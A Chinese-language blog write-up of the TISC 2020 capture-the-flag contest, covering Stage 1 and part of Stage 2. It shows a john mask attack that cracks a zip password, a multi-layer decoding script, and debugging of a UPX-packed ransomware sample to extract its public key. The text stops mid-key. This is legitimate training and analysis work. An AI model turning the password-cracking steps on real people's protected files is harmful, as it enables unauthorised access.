

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-28/1601270958215-icon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="gscr10">
  <meta name="keywords" content="">
  <title>TISC 2020 CTF 题目分析及writeups - Mr. Military&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      
        
        
        
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.21.0/themes/prism-tomorrow.min.css" />
      
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Mr. Military</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-28/1601271101516-wallhaven-2em38y.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-10-06 23:37" pubdate>
        October 6, 2020 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6.7k words
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      115
       mins
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">TISC 2020 CTF 题目分析及writeups</h1>
            
            <div class="markdown-body" id="post-body">
              <h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>TISC(The InfoSecurity Challenge) 2020 CTF 一共包含6道题目，主要涉及密码学、二进制、逆向等知识点，部分题目之间具备一定的连续性，下面对赛事题目进行具体分析。</p>
<h2 id="Stage-1：What-is-this-thing"><a href="#Stage-1：What-is-this-thing" class="headerlink" title="Stage 1：What is this thing?"></a>Stage 1：What is this thing?</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600913989660-s1-0.jpg" srcset="/img/loading.gif"><br>连接服务后，指向一个zip文件连接。</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\
\__$$  __|\_$$  _|$$  __$$\ $$  __$$\
   $$ |     $$ |  $$ &#x2F;  \__|$$ &#x2F;  \__|
   $$ |     $$ |  \$$$$$$\  $$ |
   $$ |     $$ |   \____$$\ $$ |
   $$ |     $$ |  $$\   $$ |$$ |  $$\
   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |
   \__|   \______| \______&#x2F;  \______&#x2F;

CSIT&#39;s The Infosecurity Challenge 2020
https:&#x2F;&#x2F;play.tisc.csit-events.sg&#x2F;

CHALLENGE 1: What is this thing?
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;

SUBMISSION_TOKEN? LdWaGOgyfbVQromGEgmzfADJYNpGEPKLUgjiudRJfMoKzpXyklQgNqSxSQeNYGsr

We noticed unusually network activity around the time that the user reported being ransomware-d.
There were files being sent and recieved, some of which we were unable to inspect.
Could you try to decode this?

Reminder! SAVE ANY CODE YOU WROTE &#x2F; TAKE SCREENSHOTS OF YOUR WORK, THIS WILL NEED TO BE SUBMITTED IN YOUR WRITEUP!
CLARITY OF DOCUMENTATION WILL CONTRIBUTE TO A BETTER EVALUATION OF YOUR WRITEUP.

The file is hosted at http:&#x2F;&#x2F;fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg:31080&#x2F;325528f1f0a95ebbcdd78180e35e2699.zip .


Flag?</code></pre>

<p>该zip文件受到密码保护，里面包含一个名为<code>temp.mess</code>的文件：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">unzip</span> d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
Archive:  d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
<span class="token punctuation">[</span>d9c8f641bd3cb1b7a9652e8d120ed9a8.zip<span class="token punctuation">]</span> temp.mess password:</code></pre>

<p>根据题目的介绍<code>they are using a simple password (6 characters, hexadecimal) on the zip files</code>，可知解压密码为6位十六进制，采用暴力破解的方式就可以得到。在破解之前，先将zip文件转换为爆破工具john接受的格式，然后开始爆破：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ zip2john d9c8f641bd3cb1b7a9652e8d120ed9a8.zip  <span class="token operator">></span> zip.hashes
ver <span class="token number">2.0</span> d9c8f641bd3cb1b7a9652e8d120ed9a8.zip/temp.mess PKZIP Encr: <span class="token assign-left variable">cmplen</span><span class="token operator">=</span><span class="token number">125108</span>, <span class="token assign-left variable">decmplen</span><span class="token operator">=</span><span class="token number">125056</span>, <span class="token assign-left variable">crc</span><span class="token operator">=</span>16B94B68

r10@kali:~/tisc$ john --min-len<span class="token operator">=</span><span class="token number">6</span> --max-len<span class="token operator">=</span><span class="token number">6</span> --mask<span class="token operator">=</span><span class="token string">'?h?h?h?h?h?h'</span> ./zip.hashes
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>PKZIP <span class="token punctuation">[</span><span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Will run <span class="token number">4</span> OpenMP threads
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
eff650           <span class="token punctuation">(</span>d9c8f641bd3cb1b7a9652e8d120ed9a8.zip/temp.mess<span class="token punctuation">)</span>
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2020</span>-08-08 <span class="token number">11</span>:18<span class="token punctuation">)</span> <span class="token number">25</span>.00g/s 9011Kp/s 9011Kc/s 9011KC/s 000650<span class="token punctuation">..</span>fff750
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed</code></pre>

<p>得到解压密码为<code>eff650</code>。使用该密码解压，得到bzip2压缩格式的<code>temp.mess</code>文件：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">unzip</span> d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
Archive:  d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
<span class="token punctuation">[</span>d9c8f641bd3cb1b7a9652e8d120ed9a8.zip<span class="token punctuation">]</span> temp.mess password:
  inflating: temp.mess
  
r10@kali:~/tisc$ <span class="token function">file</span> temp.mess
temp.mess: <span class="token function">bzip2</span> compressed data, block size <span class="token operator">=</span> 900k</code></pre>

<p>经过几个阶段的手动提取，对文件进行分析，该文件是一个包含不同格式及编码嵌套的文件，主要包括<code>bzip2 compressed</code> <code>hex encoding</code> <code>base64 encoding</code> <code>xz compressed</code> <code>gzip compressed</code> <code>zlib compressed</code>。依据这个思路，编写解压脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> shutil
<span class="token keyword">import</span> magic
<span class="token keyword">import</span> os
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> zlib
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> json

<span class="token keyword">def</span> <span class="token function">unpack</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        typed <span class="token operator">=</span> magic<span class="token punctuation">.</span>from_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token comment"># Problem with python2 magic</span>
        typed <span class="token operator">=</span> <span class="token string">"zlib"</span>

    <span class="token keyword">if</span> <span class="token string">'BS image'</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>
        typed <span class="token operator">=</span> <span class="token string">'zlib'</span>

    new_filename <span class="token operator">=</span> <span class="token string">"unknown"</span>
    out_file <span class="token operator">=</span> <span class="token string">"unknown"</span>

    <span class="token keyword">if</span> <span class="token string">"bzip2"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>
        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;b.bz2'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> new_filename<span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"bzip2 -d &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
        out_file <span class="token operator">=</span> <span class="token string">'&#123;&#125;b'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"ASCII text"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> data<span class="token punctuation">:</span>
            new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;h'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
            <span class="token builtin">open</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            out_file <span class="token operator">=</span> new_filename
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;f'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
            <span class="token builtin">open</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
            out_file <span class="token operator">=</span> new_filename
    <span class="token keyword">elif</span> <span class="token string">"XZ compressed"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>
        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;x.xz'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> new_filename<span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"xz -d &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
        out_file <span class="token operator">=</span> <span class="token string">'&#123;&#125;x'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"gzip"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>
        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;g.gz'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> new_filename<span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"gzip -d &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
        out_file <span class="token operator">=</span> <span class="token string">'&#123;&#125;g'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"zlib"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;z'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        out_file <span class="token operator">=</span> new_filename
        <span class="token builtin">open</span><span class="token punctuation">(</span>out_file<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">'JSON'</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Flag!"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> out_file


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    current <span class="token operator">=</span> <span class="token string">'temp.mess_'</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm temp.mess_*"</span><span class="token punctuation">)</span>
    shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token string">'temp.mess'</span><span class="token punctuation">,</span> <span class="token string">'temp.mess_'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        next_file <span class="token operator">=</span> unpack<span class="token punctuation">(</span>current<span class="token punctuation">)</span>
        <span class="token comment">#print('&#123;&#125; -> &#123;&#125;'.format(current, next_file))</span>
        current <span class="token operator">=</span> next_file
        <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token string">'unknown'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>执行解压脚本得到flag：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python solver.py
rm: temp.mess_*: No such <span class="token function">file</span> or directory
Flag<span class="token operator">!</span>
<span class="token punctuation">&#123;</span><span class="token string">'anoroc'</span><span class="token builtin class-name">:</span> <span class="token string">'v1.320'</span>, <span class="token string">'secret'</span><span class="token builtin class-name">:</span> <span class="token string">'TISC20&#123;q1_d06fd09ff9a27ec499df9caf42923bce&#125;'</span>, <span class="token string">'desc'</span><span class="token builtin class-name">:</span> <span class="token string">'Submit this.secret to the TISC grader to complete challenge'</span>, <span class="token string">'constants'</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token number">1116352408</span>, <span class="token number">1899447441</span>, <span class="token number">3049323471</span>, <span class="token number">3921009573</span>, <span class="token number">961987163</span>, <span class="token number">1508970993</span>, <span class="token number">2453635748</span>, <span class="token number">2870763221</span><span class="token punctuation">]</span>, <span class="token string">'sign'</span><span class="token builtin class-name">:</span> <span class="token string">'cx-1FpeoEgqkk2HN70RCmRU'</span><span class="token punctuation">&#125;</span></code></pre>

<p><strong>Flag:</strong> <code>TISC20&#123;q1_d06fd09ff9a27ec499df9caf42923bce&#125;</code></p>
<h2 id="Stage-2：Find-me-some-keys"><a href="#Stage-2：Find-me-some-keys" class="headerlink" title="Stage 2：Find me some keys"></a>Stage 2：Find me some keys</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914021085-s2-0.jpg" srcset="/img/loading.gif"><br>通过题目介绍可知，需要寻找一个完整的base64编码的公共秘钥：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">The key file will look something like this but longer:
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0NCmMyOXRaU0JpWVhObE5qUWdjM1J5YVc1bklHZHZaWE1nYUdWeVpRPT0NCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ&#x3D;&#x3D;</code></pre>

<p>这里提供了一个名为<code>encrypted.zip</code> 的文件，解压得到一些docker文件，并且被后缀<code>.anoroc</code>加密：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">unzip</span> encrypted.zip
Archive:  encrypted.zip
   creating: dockerize/
  inflating: dockerize/Dockerfile
  inflating: dockerize/anorocware
   creating: dockerize/encrypted/
 extracting: dockerize/encrypted/secret_investments.db.anoroc
   creating: dockerize/encrypted/images/
  inflating: dockerize/encrypted/images/slopes.png.anoroc
  inflating: dockerize/encrypted/images/lake.jpg.anoroc
  inflating: dockerize/encrypted/images/ridge.png.anoroc
  inflating: dockerize/encrypted/images/rocks.jp2.anoroc
  inflating: dockerize/encrypted/images/rollinginthed33p.png.anoroc
  inflating: dockerize/encrypted/images/yummy.png.anoroc
   creating: dockerize/encrypted/email/
 extracting: dockerize/encrypted/email/aqec62y3.txt.anoroc
<span class="token punctuation">..</span>.
 extracting: dockerize/encrypted/email/_7zp3gmy.txt.anoroc
 extracting: dockerize/encrypted/keydetails-enc.txt
 extracting: dockerize/encrypted/clients.db.anoroc
  inflating: dockerize/encrypted/ransomnote-anoroc.txt</code></pre>

<p>通过分析，二进制的勒索文件<code>anorocware</code>是一个重要线索，该文件格式为<code>64-bit ELF</code>：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">file</span> anorocware
anorocware: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, statically linked, stripped</code></pre>

<p>查询该文件中包含是字符串，发现为UPX打包：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ strings -a anorocware <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'packed'</span>
<span class="token variable">$Info</span><span class="token builtin class-name">:</span> This <span class="token function">file</span> is packed with the UPX executable packer http://upx.sf.net $</code></pre>

<p>利用<code>ups</code>工具解压：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ upx -d anorocware
                       Ultimate Packer <span class="token keyword">for</span> eXecutables
                          Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">1996</span> - <span class="token number">2017</span>
UPX <span class="token number">3.94</span>        Markus Oberhumer, Laszlo Molnar <span class="token operator">&amp;</span> John Reiser   May 12th <span class="token number">2017</span>

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   <span class="token number">7406375</span> <span class="token operator">&lt;</span>-   <span class="token number">3993332</span>   <span class="token number">53.92</span>%   linux/amd64   anorocware

Unpacked <span class="token number">1</span> file.</code></pre>

<p>解压出的文件是用go编译的二进制文件，我们可以放入<code>Ghidra</code> 或者<code>Binary Ninja</code>中进行分析。为了寻找base64编码的公钥，可以定位到文件中解码base64字符串的位置。数据通过<code>main.EncryptDecrypt</code>函数，然后传递到<code>encoding/base64.(*Encoding).DecodeString</code>函数中：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600913997192-s2-1.jpg" srcset="/img/loading.gif"></p>
<p>在<code>0x662175</code>处放置断点，寻找base64编码的字符串：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ gdb ./anorocware
GNU gdb <span class="token punctuation">(</span>Ubuntu <span class="token number">8.1</span>-0ubuntu3.2<span class="token punctuation">)</span> <span class="token number">8.1</span>.0.20180409-git
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2018</span> Free Software Foundation, Inc.
License GPLv3+: GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>
This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type <span class="token string">"show copying"</span>
and <span class="token string">"show warranty"</span> <span class="token keyword">for</span> details.
This GDB was configured as <span class="token string">"x86_64-linux-gnu"</span><span class="token builtin class-name">.</span>
<span class="token punctuation">..</span>.

gef<span class="token operator">></span>  br *0x662175
Breakpoint <span class="token number">1</span> at 0x662175: <span class="token function">file</span> /home/hjf98/Documents/CSPC2020Dev/goware/main.go, line <span class="token number">246</span>.</code></pre>

<p>调试运行后，检查堆栈中的值，找到匹配的字符串：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600913997194-s2-2.jpg" srcset="/img/loading.gif"></p>
<pre class="language-none"><code class="language-none">gef&gt;  x&#x2F;s $rcx
0xc000435000:	&quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJRUlEQU5CZ2txaGtpRzl3MEJBUUVG
QUFPQ0JBMEFNSUlFQ0FLQ0JBRUFtOTliMnB2dHJWaVcrak4vM05GZgp3OGczNmRRUjZpSnIrY3lSZStrOFhGe
nVIVU80TE4zdGs3NnRGUzhEYmFDY1lGaXVmOEdzdWdjUm1RREVyUFpmCnFna3ZYWnB1ZmZmVGZqVEIramUvV2
k0M2J3THF0dzBXNGNYb1BXMzN1R1ZhV1pYMG9MektDL0F4Zzdrd0l0bUcKeG5uMzIxVEFqRVpnVGJMK09hTmt
jSHpmUTdVendhRXA5VVB0VDhwR1lvTkpIbFgzZmtGcTJpVnk3N3VJNGdSSwpNZjh1alRma0lISGpRN0JFemdF
Z2s4a3F4R2FTUGxJTlFzNjVQNHR2T3BpaHFwd1VWcEFqUExOQlR0OUh6MUYvCmZSK2FEc0pRUktaTk1yV1JMd
U1ZaU8yTXg5Y1pCbnd6TDlLdUZSdkhlbE83QldheVU5ZjBYT3BnL3p5YkVRT0wKdXgram1zVXNUc1Fiaks5Y0
I2N01hMjFEK1hKSHlLZ0t1UDl1MTRtVkNaZ0NCazlseWJTMWJ4ZHZGRFFQZ2t5YwpNM3o5dnV1Y0NVMUV1MkQ
wbGhGbUozRlFmWmtBWSsrWEhVcGl3dWk5Tk8zQTlVRzdhbXlYYk9TY2xGMlg5a1JxCjBDd21xT3RCUkJFV0lT
ZTVyZHpjL0FUT1AzUHFEakd3eVNYeFdaRENIOHJyZ256V3B2MkxyaVlRVG5mMmNFMEcKL2lJOFJ3allvR0xXe
mVMVlJyMWhoWjhZNXM0Ui9zUjQ5N1dlbmtSY3BPTE9rRFZnZTdNdXNUT1doNGVOaTRnbwpQbGRzaVlUcVRuZE
Exd1Y2N3IwOXVqcHA4VnZwZEx1bys0aCs3cC9wZnBYTXN4OGRBTG9tNHNma1ljSkhoT2JrCnh0NUNwTkNrVlh
oNXRzR2hlRmI3djg1R2lORnkxN3p1YWxNZGEzMkJpblBlRWJGcnFLd0QyWjRSNVFnUXVCOHUKSXdqcVNUZ05v
OVV2dmNoNmxXQ2JqOWUrODB1Z1Y0bzdqSENkLzU2Rmt1dmhDcWlJTmRaRFVVNFpCMzdoZGVsZgplRTlOYnhEa
ktHOFY3YUNkd3FKSkRZR2l6LzNqbXVDZkIvazVGa29IU0FOZ2JMRTBBNVNtazNUOHR1djhTeitmCnY0cnJQeG
1wbjhYMlNtMUZveitVMEJXelArVkxtcExubnlYa3JPSHluOGxKRmJuL1U1TldHUkxuK2V2MkNTa3cKQUkvVGZ
IQUxxVHZqcWxHUXhUVGFZN1pua241aStEMUx6dEs4Y3BTWlhkRFZvUmgrL3ZNSUVpTnVrOCsrL3M2YQpITmQ3
d3VGa1kvWjhqakoxakgvY3NGMzdtR1lBVXhwMzJuUms1d1JwL2M2ZVdaUE0rekdpYmZFbm1GVzV5VUVVClliW
DRoenpHcjVRNmYvc3lzdXpoYXlsV2kzWEN2SXJINkxCakZOdTNVSjBWSXpjSk4wa3hhQUJhWFk4SlVEWVgKdF
hVTGlwdlVPcWt0dE9xSlN4T1hXZzcyU1dLTEt2L1F2ZkRSVlhlZFVrMDY2azdSTDFva3BiTW53WWxmWWc3Sgp
tcFpaUjJDTk53Yk1rUW0yVG1yQS9NWnVkdnF0c1g5UHBrZ0pJK1pXalV3VnRHUlVUZERNeFpXeDRIM25lSml5
CjhtOHVkazQyUk4wajNuMHdWWHNXdDZRbXk3YlFzSFlYSUhVZ2tCWFl6ZHkvdStOb2RLQWpoZFZwaUpiekluY
3oKU2RvbFhpbmlLd05VTFc4VmpqUzlLVFNSd2lkcWVPa2twTmVJcWlSbldUM1RUTUFNemI1ajBqRUdGN0wzRE
9NUAo2UUlCQXc9PQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K&quot;</code></pre>

<p>对该字符串解码，得到公钥，然后用SHA256进行哈希散列得到flag：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ public_key <span class="token operator">|</span> base64 -d
-----BEGIN PUBLIC KEY-----
MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCBAEAm99b2pvtrViW+jN/3NFf
w8g36dQR6iJr+cyRe+k8XFzuHUO4LN3tk76tFS8DbaCcYFiuf8GsugcRmQDErPZf
